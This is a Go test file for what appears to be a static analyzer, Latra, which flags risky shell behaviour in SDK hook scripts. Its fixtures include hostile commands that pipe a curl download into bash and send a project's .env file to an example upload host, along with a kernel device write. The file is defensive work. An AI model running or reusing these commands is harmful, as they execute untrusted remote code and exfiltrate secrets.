package finding_test

import (
	"testing"

	"github.com/shizuku198411/Latra/internal/analysis"
	"github.com/shizuku198411/Latra/internal/finding"
	"github.com/shizuku198411/Latra/internal/sdk"
	"github.com/shizuku198411/Latra/internal/shell"
)

func TestRemoteContentExecutionRequiresAFlowToShell(t *testing.T) {
	t.Parallel()

	positive := analyzedSDK(t, "curl https://example.invalid/install | bash\n", sdk.HookSetupBase)
	findings := finding.AnalyzeSDK(positive)
	remote := findFinding(findings, "risk.remote-content-execution")
	if remote == nil {
		t.Fatalf("findings = %#v", findings)
	}
	if remote.Confidence != "high" || len(remote.Evidence) != 2 || remote.Evidence[1].FromOperationID == "" || remote.Evidence[1].ToOperationID == "" {
		t.Fatalf("remote finding = %#v", remote)
	}

	nearMiss := analyzedSDK(t, "curl -o /tmp/install https://example.invalid/install\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(nearMiss), "risk.remote-content-execution"); got != nil {
		t.Fatalf("near-miss finding = %#v", got)
	}
}

func TestRemoteContentExecutionFollowsSubstitutionAndVariableFlow(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "payload=$(curl https://example.invalid/install)\nprintf '%s' \"$payload\" | bash\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(item), "risk.remote-content-execution"); got == nil {
		t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
	}
}

func TestProjectSecretExfiltrationFlowVariants(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		content string
	}{
		{name: "pipeline", content: `cat .env | curl --data-binary @- https://example.invalid/upload`},
		{name: "substitution", content: `curl -d "$(cat .env)" https://example.invalid/upload`},
		{name: "variable", content: "payload=$(cat .env)\ncurl -d \"$payload\" https://example.invalid/upload"},
		{name: "same operation", content: `curl -F file=@.env https://example.invalid/upload`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			item := analyzedSDK(t, test.content+"\n", sdk.HookSetupProject)
			got := findFinding(finding.AnalyzeSDK(item), "risk.project-secret-exfiltration")
			if got == nil {
				t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
			}
			if got.Severity != "critical" || len(got.Evidence) != 2 {
				t.Fatalf("exfiltration finding = %#v", got)
			}
			if got.Evidence[0].ID != "project-sensitive-file-read" || got.Evidence[0].Value != ".env" ||
				got.Evidence[1].ID != "external-send" || got.Evidence[1].FromOperationID == "" || got.Evidence[1].ToOperationID == "" {
				t.Errorf("flow evidence = %#v", got.Evidence)
			}
		})
	}
}

func TestProjectSecretExfiltrationRejectsDisconnectedAndUnavailableProject(t *testing.T) {
	t.Parallel()

	disconnected := analyzedSDK(t, "cat .env\ncurl -d public https://example.invalid/upload\n", sdk.HookSetupProject)
	if got := findFinding(finding.AnalyzeSDK(disconnected), "risk.project-secret-exfiltration"); got != nil {
		t.Fatalf("disconnected flow finding = %#v", got)
	}

	noProject := analyzedSDK(t, "cat /project/.env | curl --data-binary @- https://example.invalid/upload\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(noProject), "risk.project-secret-exfiltration"); got != nil {
		t.Fatalf("unmounted project finding = %#v", got)
	}
}

func TestCriticalExfiltrationSetsRiskFloorAndSourceSinkHighlights(t *testing.T) {
	t.Parallel()

	item := analyzedSDK(t, "curl -F file=@.env https://example.invalid/upload\n", sdk.HookSetupProject)
	findings := finding.AnalyzeSDK(item)
	assessment := finding.AssessSDK(item, findings)
	if assessment.Risk.Score < 80 || assessment.Risk.Level != "critical" || assessment.ReviewPriority.Score < 80 {
		t.Fatalf("assessment = %#v", assessment)
	}
	var highlight *finding.RiskHighlight
	for index := range assessment.KeyRisks {
		if assessment.KeyRisks[index].ID == "risk.project-secret-exfiltration" {
			highlight = &assessment.KeyRisks[index]
			break
		}
	}
	if highlight == nil || len(highlight.Scopes) != 2 {
		t.Fatalf("key risk highlight = %#v", highlight)
	}
	if highlight.Scopes[0].Value != ".env" || highlight.Scopes[1].Value != "file=@.env" {
		t.Errorf("source/sink scopes = %#v", highlight.Scopes)
	}
}

func TestLifecycleRiskAndAssuranceUseHookContext(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "printf changed > /project/generated\n", sdk.HookCheckHealth)
	findings := finding.AnalyzeSDK(item)
	if findFinding(findings, "risk.project-write-in-health-check") == nil {
		t.Fatalf("findings = %#v", findings)
	}
	if findFinding(findings, "assurance.read-only-health-check") != nil {
		t.Fatalf("unexpected read-only assurance: %#v", findings)
	}
}

func TestHealthCheckLifecycleRiskRequiresCombinedContext(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "printf changed > /project/generated\n", sdk.HookCheckHealth)
	item.Hooks[0].Analysis.Context.ProjectMounted = false
	if got := findFinding(finding.AnalyzeSDK(item), "risk.project-write-in-health-check"); got != nil {
		t.Fatalf("finding matched without project-mounted context: %#v", got)
	}
}

func TestDeviceWriteIgnoresDevNull(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "printf quiet > /dev/null\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(item), "risk.device-write"); got != nil {
		t.Fatalf("finding = %#v", got)
	}

	item = analyzedSDK(t, "printf value > /sys/kernel/example\n", sdk.HookSetupBase)
	if got := findFinding(finding.AnalyzeSDK(item), "risk.device-write"); got == nil {
		t.Fatalf("findings = %#v", finding.AnalyzeSDK(item))
	}
}

func TestAbsenceAssuranceRequiresKnownCommands(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "latra-unknown-fixture\n", sdk.HookSetupProject)
	if got := findFinding(finding.AnalyzeSDK(item), "assurance.no-dynamic-execution"); got != nil {
		t.Fatalf("finding = %#v", got)
	}
}

func TestFindingOrderIsDeterministic(t *testing.T) {
	t.Parallel()
	item := analyzedSDK(t, "curl https://example.invalid/install | bash\n", sdk.HookSetupBase)
	first := finding.AnalyzeSDK(item)
	second := finding.AnalyzeSDK(item)
	if len(first) != len(second) {
		t.Fatalf("lengths = %d, %d", len(first), len(second))
	}
	for index := range first {
		if first[index].ID != second[index].ID || first[index].Scope != second[index].Scope {
			t.Fatalf("finding order differs: %#v, %#v", first, second)
		}
	}
}

func TestResourceLimitTakesPrecedenceOverGenericUnresolvedSDK(t *testing.T) {
	t.Parallel()
	item := sdk.SDK{
		Name: "fixture", Source: sdk.SourceStore, State: sdk.StateInvalidArtifact,
		Diagnostics: []sdk.Diagnostic{{Code: "store-artifact-analysis-failed", Severity: sdk.SeverityError, Message: "resource-limit: retained-bytes limit exceeded"}},
	}
	findings := finding.AnalyzeSDK(item)
	if findFinding(findings, "risk.resource-limit-exceeded") == nil {
		t.Fatalf("findings = %#v", findings)
	}
	if findFinding(findings, "risk.unresolved-sdk") != nil {
		t.Fatalf("generic unresolved finding duplicated resource limit: %#v", findings)
	}
}

func analyzedSDK(t *testing.T, content string, hookName sdk.HookName) sdk.SDK {
	t.Helper()
	path := "fixture/hooks/" + string(hookName)
	parsed := shell.NewParser().Parse([]byte(content), path)
	if parsed.Status != shell.StatusParsed {
		t.Fatalf("parse = %#v", parsed)
	}
	result := analysis.Analyze(string(hookName), &parsed)
	return sdk.SDK{
		Name: "fixture", Source: sdk.SourceProject, State: sdk.StateResolved, Digest: "sha3-384:test",
		Files: []sdk.File{{Path: "hooks/" + string(hookName), Type: sdk.FileRegular}},
		Hooks: []sdk.Hook{{Name: hookName, Path: path, Parse: &parsed, Analysis: &result}},
	}
}

func findFinding(findings []finding.Finding, id string) *finding.Finding {
	for index := range findings {
		if findings[index].ID == id {
			return &findings[index]
		}
	}
	return nil
}
